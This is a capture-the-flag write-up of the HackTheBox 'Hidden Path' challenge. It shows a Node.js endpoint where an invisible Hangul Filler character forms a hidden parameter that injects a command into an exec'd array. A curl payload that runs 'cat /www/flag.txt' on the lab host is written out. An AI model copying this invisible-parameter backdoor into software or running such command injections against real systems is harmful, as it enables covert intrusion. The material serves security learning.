# 🔐 Hidden Path — HackTheBox CTF

## 📖 Challenge Overview

Hidden Path is a miscellaneous CTF challenge involving a vulnerable Node.js system-monitoring endpoint.

The objective was to bypass the application's command restrictions and retrieve the hidden flag.

## 🔍 Vulnerability Analysis

Examining `app.js` revealed:

```javascript
const { choice,ㅤ} = req.body;
const integerChoice = +choice;

const commands = [
    'free -m',
    'uptime',
    'iostat',
    'mpstat',
    'netstat',
    'ps aux',ㅤ
];
```

The unusual character `ㅤ` is a **Hangul Filler (U+3164)**.

It acts as a hidden parameter that allows user-controlled input to become the seventh element of the commands array.

By setting `choice=6`, we can execute our supplied command.

## 💻 Exploitation

### Step 1 — Check Connectivity

```bash
nc -vz -G 5 154.57.164.64 39786
```

### Step 2 — Execute the Payload

```bash
curl -sS --max-time 15 -X POST \
'http://154.57.164.64:39786/server_status' \
--data-urlencode 'choice=6' \
--data-urlencode 'ㅤ=cat /www/flag.txt'
```

### Payload Explanation

| Parameter | Purpose |
|---|---|
| `choice=6` | Selects the seventh command |
| `ㅤ` | Hidden Unicode parameter |
| `cat` | Displays file contents |
| `/www/flag.txt` | Location of the flag |
| `--data-urlencode` | URL-encodes the POST parameters |

The server executes:

```bash
cat /www/flag.txt
```

### 🏁 Result

```text
HTB{...}
```

**Flag successfully retrieved! ✅**

## 🧠 What I Learned

- Identifying hidden Unicode characters in source code.
- Understanding JavaScript array indexing.
- Exploiting OS command injection vulnerabilities.
- Using cURL to send HTTP POST requests.
- Bypassing command restrictions through user-controlled parameters.

## 🛡️ Prevention

Never execute user-controlled commands directly. Use strict input validation, fixed command allowlists, and avoid passing untrusted data to `exec()`.

---

